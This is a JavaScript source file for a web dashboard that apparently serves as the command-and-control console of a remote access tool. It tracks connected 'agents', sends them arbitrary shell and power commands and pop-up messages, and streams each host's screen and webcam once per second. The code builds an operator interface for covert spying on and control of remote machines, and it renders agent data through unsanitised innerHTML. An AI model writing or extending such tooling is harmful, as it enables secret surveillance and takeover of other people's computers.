// Global state
let currentAgent = null;
let agents = [];
let screenStreamInterval = null;
let webcamStreamInterval = null;
let commandCount = 0;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initNavigation();
    initTabs();
    initShellInput();
    fetchAgents();
    setInterval(fetchAgents, 5000);
});

// Navigation
function initNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const view = item.dataset.view;
            switchView(view);
            
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');
        });
    });
}

function switchView(viewName) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewName).classList.add('active');
    
    const titles = {
        dashboard: 'Dashboard',
        agents: 'Agents',
        commands: 'Commands',
        logs: 'System Logs'
    };
    document.getElementById('pageTitle').textContent = titles[viewName] || viewName;
}

// Tabs
function initTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const tabName = tab.dataset.tab;
            
            // Stop all streams when switching tabs
            stopScreenStream();
            stopWebcamStream();
            
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            tab.classList.add('active');
            document.getElementById(tabName).classList.add('active');
            
            // Auto-start stream when opening screen/webcam tab
            if (tabName === 'screen') {
                setTimeout(() => startScreenStream(), 500);
            } else if (tabName === 'webcam') {
                setTimeout(() => startWebcamStream(), 500);
            }
        });
    });
}

// Fetch agents
async function fetchAgents() {
    try {
        const res = await fetch('/api/ping');
        const data = await res.json();
        agents = data;
        
        updateDashboard();
        updateAgentsGrid();
        addLog('info', `Fetched ${data.length} agents`);
    } catch (e) {
        console.error('Failed to fetch agents:', e);
        addLog('error', 'Failed to fetch agents');
    }
}

// Update dashboard stats
function updateDashboard() {
    const now = new Date();
    const online = agents.filter(a => (now - new Date(a.last_seen)) < 60000);
    const offline = agents.length - online.length;
    
    document.getElementById('totalAgents').textContent = agents.length;
    document.getElementById('onlineAgents').textContent = online.length;
    document.getElementById('offlineAgents').textContent = offline.length;
    document.getElementById('onlineCount').textContent = online.length;
    document.getElementById('commandsExecuted').textContent = commandCount;
    
    // Update activity
    const activityList = document.getElementById('activityList');
    if (agents.length > 0) {
        activityList.innerHTML = agents.slice(0, 5).map(agent => {
            const isOnline = (now - new Date(agent.last_seen)) < 60000;
            return `
                <div class="activity-item">
                    <span class="activity-time">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    <span class="activity-text">
                        ${agent.hostname} - ${isOnline ? '🟢 Online' : '🔴 Offline'}
                    </span>
                </div>
            `;
        }).join('');
    }
}

// Update agents grid
function updateAgentsGrid() {
    const grid = document.getElementById('agentsGrid');
    const now = new Date();
    
    if (agents.length === 0) {
        grid.innerHTML = '<p class="empty-state">No agents connected</p>';
        return;
    }
    
    grid.innerHTML = agents.map(agent => {
        const isOnline = (now - new Date(agent.last_seen)) < 60000;
        return `
            <div class="agent-card" onclick="openAgentModal('${agent.id}')">
                <div class="agent-header">
                    <h3>${agent.hostname}</h3>
                    <span class="agent-status ${isOnline ? 'online' : 'offline'}">
                        ${isOnline ? '● ONLINE' : '● OFFLINE'}
                    </span>
                </div>
                <div class="agent-info">
                    <div class="agent-info-item">
                        <span class="label">UUID:</span>
                        <span class="value">${agent.id.substring(0, 8)}...</span>
                    </div>
                    <div class="agent-info-item">
                        <span class="label">Last Seen:</span>
                        <span class="value">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// Modal functions
function openAgentModal(agentId) {
    const agent = agents.find(a => a.id === agentId);
    if (!agent) return;
    
    currentAgent = agent;
    const now = new Date();
    const isOnline = (now - new Date(agent.last_seen)) < 60000;
    
    document.getElementById('modalAgentName').textContent = agent.hostname;
    document.getElementById('detailId').textContent = agent.id;
    document.getElementById('detailHostname').textContent = agent.hostname;
    document.getElementById('detailStatus').innerHTML = isOnline 
        ? '<span style="color: var(--success)">● ONLINE</span>' 
        : '<span style="color: var(--danger)">● OFFLINE</span>';
    document.getElementById('detailLastSeen').textContent = new Date(agent.last_seen).toLocaleString();
    
    document.getElementById('agentModal').classList.add('active');
    addLog('info', `Opened details for ${agent.hostname}`);
}

function closeModal() {
    document.getElementById('agentModal').classList.remove('active');
    stopScreenStream();
    stopWebcamStream();
    currentAgent = null;
}

// Shell commands
function initShellInput() {
    const input = document.getElementById('shellInput');
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            executeShellCommand();
        }
    });
}

async function executeShellCommand() {
    if (!currentAgent) return;
    
    const input = document.getElementById('shellInput');
    const command = input.value.trim();
    if (!command) return;
    
    const output = document.getElementById('terminalOutput');
    output.innerHTML += `<div class="terminal-line">$ ${command}</div>`;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'shell',
                command: command
            })
        });
        
        const result = await res.json();
        output.innerHTML += `<div class="terminal-line">${result.output || 'Command sent'}</div>`;
        output.scrollTop = output.scrollHeight;
        
        commandCount++;
        addCommandToHistory('shell', command, result.output);
        addLog('success', `Executed: ${command} on ${currentAgent.hostname}`);
    } catch (e) {
        output.innerHTML += `<div class="terminal-line" style="color: #f00;">Error: ${e.message}</div>`;
        addLog('error', `Failed to execute command: ${e.message}`);
    }
    
    input.value = '';
}

// Power commands
async function sendPowerCommand(action) {
    if (!currentAgent) return;
    
    const confirmMsg = `Are you sure you want to ${action} ${currentAgent.hostname}?`;
    if (!confirm(confirmMsg)) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'power',
                action: action
            })
        });
        
        const result = await res.json();
        alert(`Power command sent: ${action}`);
        commandCount++;
        addCommandToHistory('power', action, 'Command sent');
        addLog('warning', `Power command ${action} sent to ${currentAgent.hostname}`);
    } catch (e) {
        alert(`Error: ${e.message}`);
        addLog('error', `Failed to send power command: ${e.message}`);
    }
}

// Screen capture
async function captureScreen() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'screen',
                action: 'capture'
            })
        });
        
        const result = await res.json();
        if (result.status === 'ok') {
            // Command queued, wait for result
            setTimeout(() => checkScreenResult(), 1000);
        }
    } catch (e) {
        console.error('Screen capture error:', e);
    }
}

async function checkScreenResult() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch(`/api/command?agentId=${currentAgent.id}`);
        const commands = await res.json();
        
        // Find completed screen command
        const screenCmd = commands.find(c => c.type === 'screen' && c.status === 'completed' && c.output);
        if (screenCmd && screenCmd.output) {
            const img = document.getElementById('screenImage');
            const placeholder = document.getElementById('screenPlaceholder');
            img.src = screenCmd.output;
            img.classList.add('active');
            placeholder.style.display = 'none';
        }
    } catch (e) {
        console.error('Check result error:', e);
    }
}

function startScreenStream() {
    if (!currentAgent || screenStreamInterval) return;
    
    captureScreen(); // First capture
    screenStreamInterval = setInterval(captureScreen, 1000); // Every 1 second
    addLog('info', `Started screen stream from ${currentAgent.hostname}`);
}

function stopScreenStream() {
    if (screenStreamInterval) {
        clearInterval(screenStreamInterval);
        screenStreamInterval = null;
        addLog('info', 'Stopped screen stream');
    }
}

// Webcam capture
async function captureWebcam() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'webcam',
                action: 'capture'
            })
        });
        
        const result = await res.json();
        if (result.status === 'ok') {
            setTimeout(() => checkWebcamResult(), 1000);
        }
    } catch (e) {
        console.error('Webcam capture error:', e);
    }
}

async function checkWebcamResult() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch(`/api/command?agentId=${currentAgent.id}`);
        const commands = await res.json();
        
        const webcamCmd = commands.find(c => c.type === 'webcam' && c.status === 'completed' && c.output);
        if (webcamCmd && webcamCmd.output) {
            const img = document.getElementById('webcamImage');
            const placeholder = document.getElementById('webcamPlaceholder');
            img.src = webcamCmd.output;
            img.classList.add('active');
            placeholder.style.display = 'none';
        }
    } catch (e) {
        console.error('Check webcam result error:', e);
    }
}

function startWebcamStream() {
    if (!currentAgent || webcamStreamInterval) return;
    
    captureWebcam(); // First capture
    webcamStreamInterval = setInterval(captureWebcam, 1000); // Every 1 second
    addLog('info', `Started webcam stream from ${currentAgent.hostname}`);
}

function stopWebcamStream() {
    if (webcamStreamInterval) {
        clearInterval(webcamStreamInterval);
        webcamStreamInterval = null;
        addLog('info', 'Stopped webcam stream');
    }
}

// Message box
async function sendMessageBox() {
    if (!currentAgent) return;
    
    const title = document.getElementById('msgTitle').value;
    const content = document.getElementById('msgContent').value;
    const type = document.getElementById('msgType').value;
    
    if (!title || !content) {
        alert('Please fill in all fields');
        return;
    }
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'message',
                title: title,
                content: content,
                messageType: type
            })
        });
        
        const result = await res.json();
        alert('Message sent successfully');
        commandCount++;
        addCommandToHistory('message', `${title}: ${content}`, 'Message sent');
        addLog('success', `Message sent to ${currentAgent.hostname}`);
    } catch (e) {
        alert(`Error: ${e.message}`);
        addLog('error', `Failed to send message: ${e.message}`);
    }
}

// Command history
function addCommandToHistory(type, command, result) {
    const historyList = document.getElementById('historyList');
    
    if (historyList.querySelector('.empty-state')) {
        historyList.innerHTML = '';
    }
    
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div class="history-header">
            <span>${currentAgent?.hostname || 'Unknown'}</span>
            <span>${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="history-command">[${type}] ${command}</div>
        <div class="history-result">${result}</div>
    `;
    
    historyList.insertBefore(item, historyList.firstChild);
}

// Logs
function addLog(level, message) {
    const logsContent = document.getElementById('logsContent');
    const time = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${level}`;
    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-message">${message}</span>`;
    
    logsContent.appendChild(entry);
    logsContent.scrollTop = logsContent.scrollHeight;
}

function clearLogs() {
    const logsContent = document.getElementById('logsContent');
    logsContent.innerHTML = '<div class="log-entry info"><span class="log-time">[' + 
        new Date().toLocaleTimeString() + ']</span><span class="log-message">Logs cleared</span></div>';
}

// Search
document.getElementById('searchInput')?.addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase();
    document.querySelectorAll('.agent-card').forEach(card => {
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(query) ? 'block' : 'none';
    });
});

// Close modal on outside click
document.getElementById('agentModal')?.addEventListener('click', (e) => {
    if (e.target.id === 'agentModal') {
        closeModal();
    }
});
